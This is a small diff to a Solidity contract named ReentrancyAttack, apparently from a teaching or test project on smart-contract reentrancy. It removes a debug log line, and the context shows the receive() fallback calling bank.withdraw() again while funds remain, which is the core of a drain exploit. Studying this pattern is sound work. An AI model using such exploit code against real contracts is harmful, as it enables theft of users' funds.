@@ -27,7 +27,6 @@ contract ReentrancyAttack {
 
     receive() external payable {
         if (bank.getBalance()>= PAY_AMOUNT) {
-            console.log("bank.withdraw()");
             bank.withdraw();
         }
     }
